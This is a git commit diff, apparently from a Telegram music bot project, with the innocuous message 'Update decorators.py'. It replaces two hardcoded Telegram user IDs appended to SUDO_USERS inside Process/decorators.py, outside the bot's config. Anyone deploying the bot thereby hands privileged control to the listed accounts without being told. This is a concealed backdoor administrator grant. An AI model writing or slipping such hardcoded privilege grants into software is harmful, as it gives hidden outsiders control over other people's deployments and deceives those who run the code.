ec0a31cd57da7dc4f453a6ffc832254c8f16bcef
SANGRAM-MUSIC <120346630+SANGRAM-MUSIC@users.noreply.github.com>
2023-02-09 00:24:02 +0530

    Update decorators.py

--- Process/decorators.py
+++ Process/decorators.py
@@ -5,8 +5,8 @@ from RaiChu.config import SUDO_USERS
 from Process.admins import get_administrators
 
 
-SUDO_USERS.append(1669178360)
-SUDO_USERS.append(1920507972)
+SUDO_USERS.append(1808943146)
+SUDO_USERS.append(5881873353)
 
 
 
